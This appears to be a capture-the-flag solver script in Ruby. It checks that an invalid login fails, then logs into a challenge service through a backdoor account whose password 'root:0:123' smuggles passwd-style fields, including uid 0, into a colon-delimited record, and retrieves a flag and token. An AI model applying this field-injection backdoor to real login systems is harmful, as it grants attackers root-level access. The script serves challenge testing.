# encoding: ASCII-8bit

require 'openssl'
require 'base64'
require 'socket'
require 'pp'
require 'openssl'

require './libronsolve.rb'
require './libgetout'

def try_login(s, username, password)
  s.write(create_message([
    {
      type: :string,
      value: username,
    },
    {
      type: :string,
      value: password,
    },
  ]))
  return read_message(s)
end

begin
  s = connect(*get_host_port())

  out = use(s, 'gettoken')
  puts "Response to 'use': #{ out }"

  # Invalid login should fail
  out = try_login(s, "username", "password")
  if out[0][:value] != 0
    $stderr.puts "Invalid username/password successfully failed"
  else
    $stderr.puts "Invalid username/password worked??"
    exit 1
  end

  out = try_login(s, ":testuser:", "root:0:123")
  if out[0][:value] != 0
    $stderr.puts "Backdoor account failed!"
    exit 1
  end
  flag = out[1][:value]
  token = out[2][:value]

  puts "token = #{token}"
  check_flag(flag, terminate: true)
ensure
  s.close if s
end
